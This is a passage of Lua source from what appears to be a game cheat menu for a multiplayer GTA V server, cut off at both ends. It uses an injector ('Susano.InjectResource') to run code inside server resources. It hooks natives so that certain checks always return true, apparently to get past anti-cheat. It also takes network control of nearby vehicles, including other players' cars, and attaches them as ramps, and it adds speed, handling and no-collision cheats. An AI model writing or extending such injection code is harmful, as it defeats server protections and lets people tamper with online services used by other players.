                    if DoesExtraExist(vehicle, extra) then
                        SetVehicleExtra(vehicle, extra, false)
                    end
                end
                
                SetVehicleWindowTint(vehicle, 1)
                
                SetVehicleTyresCanBurst(vehicle, false)
                
                Wait(100)
                
                SetEntityAsMissionEntity(vehicle, false, true)
            end)
        ]])
    end
end


local function RepairVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local susano = rawget(_G, "Susano")
            
            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _repair_vehicle_hooks_applied then
                _repair_vehicle_hooks_applied = true
                
                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)
                
                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)
                
                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)
                
                susano.HookNative(0x115722B1B9C14C1C, function(vehicle)
                    return true
                end)
            end
            
            CreateThread(function()
                Wait(100)
                
                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)
                
                if not vehicle or vehicle == 0 then
                    return
                end
                
                if not NetworkHasControlOfEntity(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(vehicle) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                
                SetEntityAsMissionEntity(vehicle, true, true)
                
                SetVehicleFixed(vehicle)
                SetVehicleDeformationFixed(vehicle)
                SetVehicleUndriveable(vehicle, false)
                SetVehicleEngineOn(vehicle, true, true, false)
                
                SetVehicleTyresCanBurst(vehicle, true)
                for i = 0, 3 do
                    SetVehicleTyreFixed(vehicle, i)
                end
                
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                
                SetVehicleEngineHealth(vehicle, 1000.0)
                SetVehicleBodyHealth(vehicle, 1000.0)
                SetVehiclePetrolTankHealth(vehicle, 1000.0)
                
                SetVehicleDirtLevel(vehicle, 0.0)
                WashDecalsFromVehicle(vehicle, 1.0)
                
                Wait(100)
                
                SetEntityAsMissionEntity(vehicle, false, true)
            end)
        ]])
    end
end


local function RampVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityForwardVector", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)
            
            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end
            
            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end
            
            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local myHeading = GetEntityHeading(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success
                
                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)
                
                if #vehicles < 3 then
                    return
                end
                
                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}
                
                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end
                
                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end
                
                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)
                
                local heading = GetEntityHeading(myVehicle)
                local forwardVector = GetEntityForwardVector(myVehicle)
                local vehCoords = GetEntityCoords(myVehicle)
                local rampPositions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                }
                
                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = rampPositions[i]
                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end
        
        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end
        
        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local myHeading = GetEntityHeading(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success
            
            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)
            
            if #vehicles < 3 then
                return
            end
            
            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}
            
            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end
            
            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end
            
            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)
            
            local heading = GetEntityHeading(myVehicle)
            local forwardVector = GetEntityForwardVector(myVehicle)
            local vehCoords = GetEntityCoords(myVehicle)
            local rampPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
            }
            
            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = rampPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end

local function WallVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end

            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end

            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 3 then
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)

                local wallPositions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                }

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = wallPositions[i]
                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)

            local wallPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = wallPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end

local function Wall2Vehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end

            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end

            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 3 then
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)

                local wall2Positions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                }

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = wall2Positions[i]
                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)

            local wall2Positions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = wall2Positions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end


local function ToggleForceVehicleEngine(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local susano = rawget(_G, "Susano")
            
            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _force_engine_hooks_applied then
                _force_engine_hooks_applied = true
                
                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)
                
                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)
                
                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)
                
                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)
            end
            
            _G.ForceVehicleEngineEnabled = %s
            
            if _G.ForceVehicleEngineThread then
            end
            
            _G.ForceVehicleEngineThread = CreateThread(function()
                while _G.ForceVehicleEngineEnabled do
                    Wait(0)
                    
                    local ped = PlayerPedId()
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    
                    if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                        if not NetworkHasControlOfEntity(vehicle) then
                            NetworkRequestControlOfEntity(vehicle)
                        end
                        
                        SetVehicleEngineOn(vehicle, true, true, false)
                        
                        SetVehicleEngineHealth(vehicle, 1000.0)
                        
                        SetVehicleUndriveable(vehicle, false)
                    end
                end
                
                _G.ForceVehicleEngineThread = nil
            end)
        ]], tostring(enable)))
    end
end


local function ToggleShiftBoost(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
            QwErTyUiOpSh = %s
            
            if QwErTyUiOpSh then
                local function ZxCvBnMmLl()
                    CreateThread(function()
                        while QwErTyUiOpSh and not Unloaded do
                            local ped = PlayerPedId()
                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh ~= 0 and IsDisabledControlJustPressed(0, 21) then
                                    SetVehicleForwardSpeed(veh, 150.0)
                                end
                            end
                            Wait(0)
                        end
                    end)
                end
                ZxCvBnMmLl()
            end
        ]], tostring(enable)))
    end
end


local spawnItems = {"Car", "Moto", "Plane", "Boat"}
for _, itemName in ipairs(spawnItems) do
    local item = FindItem("Vehicle", "Spawn", itemName)
    if item then
        item.onClick = function(index, option)
            SpawnVehicle(option)
        end
    end
end


Actions.maxUpgradeItem = FindItem("Vehicle", "Performance", "Max Upgrade")
if Actions.maxUpgradeItem then
    Actions.maxUpgradeItem.onClick = function()
        MaxUpgrade()
    end
end


Actions.repairVehicleItem = FindItem("Vehicle", "Performance", "Repair Vehicle")
if Actions.repairVehicleItem then
    Actions.repairVehicleItem.onClick = function()
        RepairVehicle()
    end
end

Actions.throwFromVehicleItem = FindItem("Vehicle", "Performance", "Throw From Vehicle")
if Actions.throwFromVehicleItem then
    Actions.throwFromVehicleItem.onClick = function()
        local isEnabled = Actions.throwFromVehicleItem.value
        
        if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
            return
        end
        
        if isEnabled then
            Susano.InjectResource("any", [[
                rawset(_G, 'ThrowFromVehicleEnabled', true)
                
                if not rawget(_G, 'ThrowFromVehicleThread') then
                    rawset(_G, 'ThrowFromVehicleThread', true)
                    
                    CreateThread(function()
                        while not Unloaded do
                            if rawget(_G, 'ThrowFromVehicleEnabled') then
                                SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            else
                                SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                                SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            end
                            Wait(0)
                        end
                        
                        SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                        SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                    end)
                end
            ]])
        else
            Susano.InjectResource("any", [[
                rawset(_G, 'ThrowFromVehicleEnabled', false)
                SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                ClearRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
            ]])
        end
    end
end


local function ToggleEasyHandling(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if _G.EasyHandlingEnabled == nil then _G.EasyHandlingEnabled = false end
            _G.EasyHandlingEnabled = %s

            if _G.EasyHandlingEnabled then
                local function StartEasyHandling()
                    CreateThread(function()
                        while _G.EasyHandlingEnabled and not Unloaded do
                            Wait(0)
                            local ped = PlayerPedId()
                            if ped and ped ~= 0 then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    SetVehicleGravityAmount(veh, 73.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 500.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 5.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionLossMult", 0.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fLowSpeedTractionLossMult", 0.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 40.0)
                                    ModifyVehicleTopSpeed(veh, 1.5)
                                end
                            end
                        end
                    end)
                end
                StartEasyHandling()
            else
                local ped = PlayerPedId()
                if ped and ped ~= 0 then
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        SetVehicleGravityAmount(veh, 9.8)
                        SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 1500.0)
                        SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0)
                        ModifyVehicleTopSpeed(veh, 1.0)
                    end
                end
            end
        ]], tostring(enable)))
    end
end

Actions.forceEngineItem = FindItem("Vehicle", "Performance", "Force Vehicle Engine")
if Actions.forceEngineItem then
    Actions.forceEngineItem.onClick = function(value)
        ToggleForceVehicleEngine(value)
    end
end

Actions.easyHandlingItem = FindItem("Vehicle", "Performance", "Easy Handling")
if Actions.easyHandlingItem then
    Actions.easyHandlingItem.onClick = function(value)
        ToggleEasyHandling(value)
    end
end

local function ToggleNoCollision(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityNoCollisionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            
            if not _G.no_vehicle_collision_active then
                _G.no_vehicle_collision_active = false
            end
            _G.no_vehicle_collision_active = %s
            
            if _G.no_vehicle_collision_active then
                CreateThread(function()
                    while _G.no_vehicle_collision_active do
                        Wait(0)
                        
                        local ped = PlayerPedId()
                        if IsPedInAnyVehicle(ped, false) then
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and veh ~= 0 then
                                SetEntityNoCollisionEntity(veh, veh, false)
                                
